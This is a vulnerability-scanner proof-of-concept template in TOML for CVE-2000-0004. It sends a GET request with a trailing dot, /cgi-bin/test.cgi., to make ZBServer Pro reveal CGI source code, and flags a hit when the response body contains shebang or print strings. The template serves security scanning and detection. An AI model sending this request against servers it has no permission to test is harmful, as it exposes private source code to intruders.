[info]
author = "AVE"
description = "ZBServer Pro 存在源代码泄露漏洞，通过在 URL 中插入点号（.）可读取可执行文件源码"
id = "POC-AVE-2000-0006"
name = "ZBServer Pro Source Code Disclosure PoC"
severity = "medium"
tags = [
    "cve-2000-0004",
    "zbserver",
    "source-code-disclosure",
]
vuln_id = [
    "CVE-2000-0004",
    "AVE-2000-0006",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/test.cgi."
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "#!/usr/bin",
    "Content-Type",
    "print",
]
